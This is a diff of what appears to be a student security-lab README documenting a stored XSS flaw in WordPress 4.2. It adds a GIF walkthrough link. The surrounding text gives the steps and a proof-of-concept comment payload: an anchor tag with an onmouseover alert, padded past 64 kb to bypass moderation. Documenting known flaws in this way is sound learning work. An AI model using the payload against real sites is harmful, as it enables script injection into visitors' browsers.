@@ -11,7 +11,7 @@ Time spent: **X** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [x] GIF Walkthrough: 
+  - [x] GIF Walkthrough: ![v1](v1.gif)
   - [x] Steps to recreate: To get pass the admin's approval to the comment, the comment need to have an harmful html tag. In the html, you would want the text to long enough that it passes the size of 64 kb.
   - [x] Affected source code: `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA [64 kb] ... AAAA'></a>`
     - [Link 1](https://wpscan.com/vulnerability/8051e64b-f73e-45ce-a853-02b8e425155b)
